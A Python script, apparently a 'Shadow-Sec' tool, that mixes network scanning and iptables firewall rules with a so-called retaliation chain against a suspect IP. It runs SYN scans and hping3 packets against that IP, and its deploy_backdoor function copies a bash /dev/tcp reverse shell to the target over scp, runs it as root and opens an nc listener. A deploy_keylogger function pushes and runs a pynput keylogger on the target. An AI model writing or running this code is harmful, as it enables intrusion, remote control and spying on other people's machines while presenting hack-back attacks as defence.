import os
import time
import subprocess
import logging

# Configure logging
log_file = "/root/Shadow-Sec-Vault/logs/alert.log"
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# ASCII Art for Shadow-Sec (Aesthetics)
ascii_art = """
█████  ██      ███████ ██████  ████████     
██   ██ ██      ██      ██   ██    ██       
███████ ██      █████   ██████     ██       
██   ██ ██      ██      ██   ██    ██       
██   ██ ███████ ███████ ██   ██    ██    ██ 
"""

# Function to display the ASCII art at the start of the script
def display_ascii_art():
    print(ascii_art)
    logging.info("Displayed ASCII art for Shadow-Sec.")

# Function to scan the network for anomalies
def scan_network():
    logging.info("Starting network scan.")
    print("Scanning Network for Anomalies...")
    time.sleep(1.5)
    try:
        result = subprocess.run(["nmap", "-sn", "192.168.1.0/24"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            logging.info("Network scan complete.")
            logging.info(result.stdout.decode())
            print("[SUCCESS] Network anomalies scan complete.\n")
            print(result.stdout.decode())
        else:
            logging.error(f"Network scan failed: {result.stderr.decode()}")
            print(f"[ERROR] Network scan failed: {result.stderr.decode()}")
    except Exception as e:
        logging.error(f"Unexpected error during network scan: {e}")
        print(f"[ERROR] Unexpected error during network scan: {e}")

# Function to deploy firewalls and security filters
def deploy_firewalls():
    logging.info("Deploying firewalls and security filters.")
    print("Deploying Firewalls and Security Filters...")
    time.sleep(1.5)
    try:
        os.system("iptables -A INPUT -p tcp --dport 22 -j ACCEPT")
        os.system("iptables -A INPUT -p tcp --dport 80 -j ACCEPT")
        os.system("iptables -A INPUT -p tcp --dport 443 -j ACCEPT")
        os.system("iptables -A INPUT -p udp --dport 53 -j ACCEPT")
        os.system("iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT")
        os.system("iptables -P INPUT DROP")
        logging.info("Firewalls deployed successfully.")
        print("[SUCCESS] Firewalls deployed, security filters active.\n")
    except Exception as e:
        logging.error(f"Failed to deploy firewalls: {e}")
        print(f"[ERROR] Failed to deploy firewalls: {e}")

# Function to isolate a malicious IP from the network
def isolate_ip(ip_address):
    logging.info(f"Isolating malicious IP: {ip_address}")
    print("Isolating Malicious IP from Network...")
    time.sleep(1.5)
    try:
        result = os.system(f"iptables -A INPUT -s {ip_address} -j DROP")
        if result == 0:
            logging.info(f"Suspicious IP {ip_address} successfully isolated.")
            print(f"[SUCCESS] Suspicious IP {ip_address} isolated from network.\n")
        else:
            logging.error(f"Failed to isolate IP {ip_address}.")
            print(f"[ERROR] Failed to isolate IP {ip_address}. Check permissions or iptables configuration.")
    except Exception as e:
        logging.error(f"Error isolating IP {ip_address}: {e}")
        print(f"[ERROR] Error isolating IP {ip_address}: {e}")

# Function to retaliate against an IP
def retaliate_against_ip(ip_address):
    print(f"Deploying countermeasures against {ip_address}...")
    logging.info(f"Initiating countermeasures against {ip_address}")

    # Example: Perform a deeper network scan against the attacker
    try:
        result = subprocess.run(
            ["nmap", "-sS", "-O", ip_address],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        if result.returncode == 0:
            logging.info(f"Counter-scan completed: {result.stdout.decode()}")
            print(result.stdout.decode())
        else:
            logging.error(f"Counter-scan failed: {result.stderr.decode()}")
            print(f"[ERROR] Counter-scan failed: {result.stderr.decode()}")
    except Exception as e:
        logging.error(f"Error during counter-scan: {e}")
        print(f"[ERROR] Error during counter-scan: {e}")

# Function to gather intelligence on an IP
def gather_intelligence(ip_address):
    print(f"Gathering intelligence on {ip_address}...")
    try:
        result = subprocess.run(
            ["theHarvester", "-d", ip_address, "-b", "all"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        if result.returncode == 0:
            logging.info("Intrusion analysis completed successfully.")
            logging.info(result.stdout.decode())
            print(result.stdout.decode())
        else:
            logging.error(f"Intrusion analysis failed: {result.stderr.decode()}")
            print(f"[ERROR] Intrusion analysis failed: {result.stderr.decode()}")
    except Exception as e:
        logging.error(f"Error during intrusion analysis: {e}")
        print(f"[ERROR] Error during intrusion analysis: {e}")

# Function to deploy active defense
def deploy_active_defense(ip_address):
    print(f"Deploying active defenses against {ip_address}...")
    logging.info(f"Deploying active defenses against {ip_address}")

    # Example: Start a simple honeypot (placeholder)
    try:
        subprocess.Popen(["nc", "-l", "5555"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        logging.info("Honeypot started on port 5555.")
        print("[SUCCESS] Honeypot activated.")
    except Exception as e:
        logging.error(f"Error deploying honeypot: {e}")
        print(f"[ERROR] Error deploying honeypot: {e}")

    # Example: Sending defense packets
    try:
        subprocess.run(["hping3", "-c", "3", "-p", "80", "-S", ip_address], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        logging.info("Active defense packets sent.")
        print("[SUCCESS] Active defense packets sent.")
    except Exception as e:
        logging.error(f"Error sending active defense packets: {e}")
        print(f"[ERROR] Error sending active defense packets: {e}")

# Function to deploy a backdoor payload on a target system
def deploy_backdoor(ip_address):
    logging.info(f"Deploying backdoor on {ip_address}")
    print(f"Deploying backdoor on {ip_address}...")

    try:
        # Backdoor payload example: set up reverse shell
        payload = """
        bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
        """

        # Save payload to a file
        with open("backdoor.sh", "w") as f:
            f.write(payload)

        # Transfer the payload to the target machine
        subprocess.run(
            ["scp", "backdoor.sh", f"root@{ip_address}:/tmp/backdoor.sh"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        logging.info(f"Backdoor script deployed to {ip_address}.")
        print("[SUCCESS] Backdoor script deployed to target system.")

        # Trigger the execution of the backdoor on the target machine
        subprocess.run(
            ["ssh", f"root@{ip_address}", "bash /tmp/backdoor.sh"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        logging.info(f"Backdoor executed successfully on {ip_address}.")
        print("[SUCCESS] Backdoor executed on target system.")
        
        # Connect back to the attacker system
        subprocess.run(
            ["nc", "-lvp", "4444"], stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        logging.info(f"Backdoor connection established with {ip_address}.")
        print("[SUCCESS] Connection established to the backdoor.")

    except Exception as e:
        logging.error(f"Error deploying backdoor: {e}")
        print(f"[ERROR] Error deploying backdoor: {e}")

# Function to deploy a keylogger (Spyware) payload
def deploy_keylogger(ip_address):
    logging.info(f"Deploying keylogger on {ip_address}")
    print(f"Deploying keylogger on {ip_address}...")

    try:
        # Keylogger payload example: set up keylogger (e.g., using a simple Python script)
        keylogger_payload = """
        import pynput.mouse
        import pynput.keyboard

        # Callback functions to capture keystrokes and mouse events
        def on_press(key):
            try:
                print(f'Key pressed: {key.char}')
            except AttributeError:
                print(f'Key pressed: {key}')
                
        def on_move(x, y):
            print(f'Mouse moved to ({x}, {y})')

        def on_click(x, y, button, pressed):
            print(f'Mouse clicked at ({x}, {y}) with {button}')

        # Start listeners for keyboard and mouse
        with pynput.mouse.Listener(on_move=on_move, on_click=on_click) as mouse_listener:
            with pynput.keyboard.Listener(on_press=on_press) as keyboard_listener:
                mouse_listener.join()
                keyboard_listener.join()
        """

        # Save payload to a file
        with open("keylogger.py", "w") as f:
            f.write(keylogger_payload)

        # Transfer the payload to the target machine
        subprocess.run(
            ["scp", "keylogger.py", f"root@{ip_address}:/tmp/keylogger.py"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        logging.info(f"Keylogger script deployed to {ip_address}.")
        print("[SUCCESS] Keylogger script deployed to target system.")

        # Trigger the execution of the keylogger on the target machine
        subprocess.run(
            ["ssh", f"root@{ip_address}", "python3 /tmp/keylogger.py"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        logging.info(f"Keylogger executed successfully on {ip_address}.")
        print("[SUCCESS] Keylogger executed on target system.")

    except Exception as e:
        logging.error(f"Error deploying keylogger: {e}")
        print(f"[ERROR] Error deploying keylogger: {e}")

# Main function to demonstrate functionality
if __name__ == "__main__":
    # Display the ASCII art at the start
    display_ascii_art()

    # Example target IP
    suspicious_ip = "192.168.1.100"

    # Perform defensive and countermeasure steps
    scan_network()
    deploy_firewalls()
    isolate_ip(suspicious_ip)
    retaliate_against_ip(suspicious_ip)
    gather_intelligence(suspicious_ip)
    deploy_active_defense(suspicious_ip)

    # Deploy backdoor payload
    deploy_backdoor(suspicious_ip)

    # Deploy keylogger (Spyware)
    deploy_keylogger(suspicious_ip)

    logging.info("All defenses deployed. System secure.")
    print("All defenses deployed. System secure.")
